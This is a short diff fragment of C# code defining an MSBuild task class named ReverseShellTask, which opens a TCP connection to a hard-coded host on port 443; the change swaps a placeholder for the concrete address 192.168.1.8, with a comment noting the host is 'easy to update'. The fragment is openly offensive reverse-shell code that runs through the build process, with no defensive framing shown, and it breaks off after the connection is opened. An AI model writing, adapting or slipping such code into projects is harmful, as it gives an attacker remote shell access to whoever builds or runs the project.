@@ -9,7 +9,7 @@
 
         public class ReverseShellTask : Microsoft.Build.Utilities.Task {
             public override bool Execute() {
-                string host = "YOUR_CURRENT_IP";  // ← Easy to update!
+                string host = "192.168.1.8";  // ← Easy to update!
                 int port = 443;
 
                 using(TcpClient client = new TcpClient(host, port)) {
